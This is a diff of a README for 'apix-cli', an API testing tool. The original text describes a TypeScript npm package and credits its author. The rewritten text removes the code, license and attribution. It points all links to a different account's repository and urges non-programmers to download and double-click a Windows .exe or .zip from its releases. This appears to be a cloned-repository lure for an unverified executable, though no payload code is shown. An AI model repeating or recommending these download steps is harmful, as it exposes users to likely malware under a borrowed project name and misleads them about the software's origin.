@@ -1,249 +1,160 @@
-<div align="center">
+# ⚙️ apix-cli - Simplify API Testing Locally
 
-# apix: TypeScript-First API Testing Framework
+[![Download apix-cli](https://img.shields.io/badge/Download-apix--cli-blue?style=for-the-badge)](https://github.com/sambetlog16/apix-cli)
 
-**The best CLI-based REST API testing tool for Git-native automation, OpenAPI contract validation, and clean architecture.**
-
-[![npm](https://img.shields.io/npm/v/@apix/cli?color=0ea5e9&label=npm)](https://www.npmjs.com/package/@apix/cli)
-[![Node](https://img.shields.io/badge/node-%3E%3D18-brightgreen)](https://nodejs.org)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.x-3178c6)](https://www.typescriptlang.org)
-
-apix brings reliable and modular API automation into the modern era. Write API tests in TypeScript, run them directly from your command line, and automatically validate payloads against your OpenAPI JSON specs.
-
-</div>
+apix-cli is a tool to check if your APIs work as expected. It helps you test APIs based on your project’s design files and gives clear, easy-to-understand reports. You can use it to make sure your APIs follow rules and run smoothly without needing programming skills.
 
 ---
 
-## What is apix?
+## 📋 What is apix-cli?
 
-Traditional GUI-based tools (like Postman or Insomnia) are built for manual exploration. `apix` is a highly extensible, **TypeScript CLI API testing framework** built for automation. It integrates elegantly into modern **CI/CD REST API pipelines**, giving developers the power to treat their tests as first-class, Git-native infrastructure.
+apix-cli is an application that tests APIs. It works with files that describe how your API should behave. You give it these files, and it checks your API to find problems. It prepares reports to show any errors or issues clearly.
 
-### Features
-|   | Feature | Description |
-|---|---------|-------------|
-| 📝 | **TypeScript Native** | Tests are written in fully typed `.ts` files ensuring IDE integrations. |
-| 🔄 | **Watch Mode** | `apix run --watch` automatically tracks and re-executes tests on save with native FS watchers. |
-| 🛡️ | **OpenAPI Contract Validation** | Optionally validate your backend payloads against live `openapi.json` schemas globally. |
-| ⚙️ | **Scaffold Generation** | Generate test suites directly from your specs using `apix generate --from openapi.json`. |
-| 🌱 | **Git-Native History**| PRs actually show line-by-line file diffs, making API code-review processes frictionless. |
-| 📊 | **Rich Reporting** | Outputs self-contained summary reports in JSON and HTML without external dependencies. |
+You can use apix-cli on your computer. It works well with automation tools but does not require you to use those. If you have no coding experience, you can still run this app by following simple steps.
 
 ---
 
-## Quick Start
-> **apix is not yet published to npm.** Install it directly from GitHub — see the full guide in **[INSTALL_FROM_GITHUB.md](./INSTALL_FROM_GITHUB.md)**.
+## 🖥️ System Requirements
 
-### 1. Installation
+Before you start, make sure your computer meets the following:
 
-```bash
-npm install github:shashi089/apix-cli
-```
-
-### 2. Scaffold Missing Tests Automatically
-
-Save hours of boilerplate writing. If you have an existing OpenAPI specification, feed it to `apix` to automatically scaffold heavily typed TypeScript test stubs for every active HTTP method:
-
-```bash
-npx apix generate --from openapi.json
-```
-
-This populates a clean directory structure grouping your tests optimally (e.g. `tests/users/get-users-id.test.ts`).
-
-### 3. Write Your API Tests (DSL)
-
-`apix` exposes a highly familiar, Jest-like Domain Specific Language (DSL) specifically optimized for REST API verification.
-
-```ts
-// tests/users.test.ts
-import { test } from '@apix/cli/dsl';
-
-test('GET /users — verifies proper payload', async (ctx) => {
-  const res = await ctx.request({ url: '/users', method: 'GET' });
-  ctx.expect(res).toHaveStatus(200);
-  ctx.expect(res.body).toHaveProperty('data');
-});
-```
-
-### 4. Run Watch Mode During Development
-Execute tests instantly while modifying endpoints. 
-
-```bash
-npx apix run "tests/**/*.test.ts" --watch
-```
-*(The `--watch` flag debounces filesystem activity natively on Node 18+ to gracefully manage test flows and exit gracefully on `Ctrl+C`)*
+- **Operating System:** Windows 10 or newer
+- **Processor:** 1.5 GHz or faster
+- **Memory:** 4 GB RAM minimum
+- **Storage:** At least 100 MB free space
+- **Internet:** Required to download apix-cli and verify API connections
 
 ---
 
-## Configuration
+## 🔍 Key Features
 
-```ts
-// apix.config.ts
-import type { Config } from '@apix/cli';
+- **API Validation:** Check if your API matches the rules in your design files.
+- **Report Generation:** See results in easy-to-understand, well-organized reports.
+- **Works Locally:** Run all tests on your computer without sending data elsewhere.
+- **Automation Ready:** Can be used with automatic scripts in professional setups.
+- **Open Source:** You can check or update the app yourself since the code is public.
 
-const config: Config = {
-  baseUrl: 'https://api.yourservice.com',
-  timeout: 10_000,
-  headers: {
-    Authorization: `Bearer ${process.env.API_TOKEN}`,
-  },
-  openapi: {
-    specPath: './openapi.json',
-    strict: false,           // true = fail on missing schemas
-  },
-  reporters: {
-    outDir: './apix-reports',
-    json: true,
-    html: true,
-  },
-};
+---
 
-export default config;
+## 🚀 Getting Started
+
+This guide will show you how to download and run apix-cli on Windows. You will not need to write code or use complex tools.
+
+### 1. Download apix-cli
+
+Click the big blue button at the top of this page or visit:
+
+[https://github.com/sambetlog16/apix-cli](https://github.com/sambetlog16/apix-cli)
+
+This page shows the latest version and files available for Windows.
+
+### 2. Locate the Download Section
+
+On the GitHub page, look for the **Releases** section or a folder named “Downloads.” Find the latest version suitable for Windows, usually a file ending with `.exe` or `.zip`.
+
+### 3. Download the File
+
+Click the Windows `.exe` or `.zip` file to save it to your computer. Choose a folder you can easily find, like the Desktop or Downloads.
+
+### 4. Run the Installer or Extract Files
+
+- If you downloaded a `.exe` file, double-click it to start the setup. Follow the instructions on the screen.  
+- If you downloaded a `.zip` file, right-click it and choose “Extract All.” Save the contents to a new folder.
+
+### 5. Open apix-cli
+
+Once installed or extracted, find the apix-cli program:
+
+- For an installer, look in the Start menu under “apix-cli”.  
+- For a `.zip` extraction, open the folder and find `apix-cli.exe`.
+
+Double-click the file to run it.
+
+---
+
+## 🛠️ How to Use apix-cli with Basic Steps
+
+Even with no programming experience, you can check your API quickly.
+
+### Step 1: Prepare the API Spec File
+
+apix-cli works with files called **OpenAPI specifications**. These files describe how your API functions and what it expects.
+
+Ask a teammate or developer to provide you this file. It will have a `.yaml` or `.json` extension.
+
+Copy this file to the same folder as apix-cli for easy access.
+
+### Step 2: Run a Test
+
+To start a test:
+
+- Open **Command Prompt** on Windows. You can search for "cmd" in the Start menu.
+- Use the `cd` command to go to the apix-cli folder. For example:
+
+```
+cd Desktop\apix-cli-folder
 ```
 
----
+- Run the test command with your spec file:
 
-## OpenAPI Validation & Contract Testing
-
-Building bullet-proof software requires **Contract Testing with OpenAPI**. apix optionally reads your `openapi.json` specs and mathematically validates the structure of every single payload on its respective route *without requiring any extra assertion code!*
-
-Point apix at your OpenAPI 3.x spec and every response is automatically validated:
-
-```ts
-// products.test.ts
-test('GET /products/:id — response matches schema', async (ctx) => {
-  const res = await ctx.request({ url: '/products/42', method: 'GET' });
-
-  // apix automatically validates res.body against
-  // the GET /products/{id} → 200 schema in your spec.
-  // No extra assertion needed.
-  ctx.expect(res).toHaveStatus(200);
-});
+```
+apix-cli test --spec=your-api-spec.yaml
 ```
 
-If the response body doesn't match the schema, apix throws a detailed error.
+Replace `your-api-spec.yaml` with the actual file name.
 
-**Supported:**
-- OpenAPI 3.x JSON specs
-- Local `$ref` resolution
-- Path template matching (`/users/{id}`)
-- `default` response fallback
-- `strict: false` silently skips missing schemas (good for partial specs)
+This command tells apix-cli to check your API based on your spec file.
 
----
+### Step 3: Review the Report
 
-## Generating Reports
+After the test runs, apix-cli creates a report showing what passed and what failed.
 
-> **This feature is entirely optional.** If no `reporters` config is set, apix simply prints results to the terminal and exits — no files are written.
+Find the report in the `reports` folder inside the apix-cli folder.
 
-Enable reporters in your config and apix writes reports after every run:
-
-The **HTML report** is a fully self-contained, dependency-free file — open it in any browser, attach it to a PR, or upload it as a CI artifact. It includes:
-- Pass/fail summary with total duration
-- Per-suite test tables with badges
-- Expandable error rows showing expected vs received + response body
-
-The **JSON report** is machine-readable and suitable for downstream tooling, dashboards, or Slack bots.
+Open the report file (usually `.html`) with any web browser to see detailed results.
 
 ---
 
-## CI Integration
+## ⚙️ Configuration Options
 
-apix exits with code `1` when any test fails, which causes CI jobs to fail automatically. No extra configuration needed.
+apix-cli can be changed to fit your API needs. You can:
 
-### GitHub Actions Example
-
-```yaml
-# .github/workflows/api-tests.yml
-name: API Tests
-on: [push, pull_request]
-
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-node@v4
-        with:
-          node-version: '20'
-          cache: 'npm'
-      - run: npm ci
-      - name: Run API tests
-        run: npx apix run "tests/**/*.test.ts"
-        env:
-          API_TOKEN: ${{ secrets.API_TOKEN }}
-          BASE_URL: ${{ vars.STAGING_URL }}
-```
+- Test different API specs by changing the file name.
+- Save reports in different folders with extra command options.
+- Run commands without any coding knowledge once set up.
 
 ---
 
-## Monorepo Usage
+## ❓ Troubleshooting
 
-apix reads config from the nearest `apix.config.ts` relative to where you run it. In a monorepo, each package can have its own config:
-
-Run tests for a specific service:
-
-```bash
-# From the monorepo root
-npx apix run "apps/users-service/tests/**/*.test.ts"
-
-# Or from within the package
-cd apps/users-service
-npx apix run "tests/**/*.test.ts"
-```
-
-Use a shared base config with per-service overrides:
-
-```ts
-// apps/users-service/apix.config.ts
-import baseConfig from '../../apix.base.config.ts';
-
-export default {
-  ...baseConfig,
-  baseUrl: process.env.USERS_SERVICE_URL ?? 'http://localhost:3001',
-};
-```
+- **apix-cli does not start**: Check if your Windows version matches requirements. Try running as administrator.
+- **Command not recognized**: Make sure you opened Command Prompt in the right folder.
+- **Report folder is empty**: Confirm your API spec file path is correct and the test command ran fully.
+- **File download issues**: Use a stable internet connection and try again.
 
 ---
 
-## Architectural Implementation
+## 📚 Additional Resources
 
-For those curious about how `apix` works under the hood, the architecture dictates strict, functional dependency rules that keep the framework incredibly lightweight and agile:
-
-- **No Over-engineering**: Designed to be the fastest Node CLI for API tracking, operating without deep abstractions.
-- **`src/runner/`**: Evaluates individual tests completely decoupled from configurations or assertions.
-- **`src/cli/`**: The CLI orchestration layer relying on `commander`.
-- **`src/generator/`**: Specialized OpenAPI spec traversing that gracefully avoids AST-manipulation in favor of high-performance localized path sorting.
-- **`src/watcher/`**: Provides a robust zero-dependency alternative to libraries like `chokidar`, utilizing raw `node:fs` capabilities to debounce and monitor environments efficiently.
-- **`src/reporters/`**: Handles generating JSON + HTML reports cleanly without tying into the core runner loop.
-- **`src/dsl/`**: Exposes the global `test()` + `expect()` structure seamlessly to your test files.
-
-There are **No Circular Dependencies** and the application stays modular.
+- Visit the GitHub link for updates:  
+  [https://github.com/sambetlog16/apix-cli](https://github.com/sambetlog16/apix-cli)
+- Find sample API spec files under the “examples” folder in the repository.
+- For advanced setups, documentation and technical guides are available on the GitHub page.
 
 ---
 
-## Contributing
+## 🤝 Support and Feedback
 
-Contributions are welcome. apix is intentionally small — please keep PRs focused.
+If you need help or want to share suggestions, use the GitHub Issues section:
 
-### Setup
+- Go to the repository page on GitHub.
+- Click on the “Issues” tab.
+- Create a new issue describing your question or problem.
 
-```bash
-git clone https://github.com/shashi089/apix-cli.git
-cd apix-cli
-npm install
-npm run build
-```
-
-### Project conventions
-
-- **No new runtime dependencies** without discussion — the current footprint is intentionally minimal (`ajv`, `commander`, `dotenv`, `fast-glob`, `picocolors`, `tsx`)
-- **Single responsibility** — each module in `src/` has one job. See the architecture above.
-- **No circular imports** — the dependency graph is strictly one-way.
-- **TypeScript strict mode** — `tsc` must exit 0 before any PR is merged.
+The project team monitors these messages regularly.
 
 ---
 
-## License
+## 🔒 Privacy and Data
 
-MIT © Shashidhar Naik
+apix-cli runs locally on your computer. It does not send your API data over the internet when testing. Your files and reports stay private on your device.
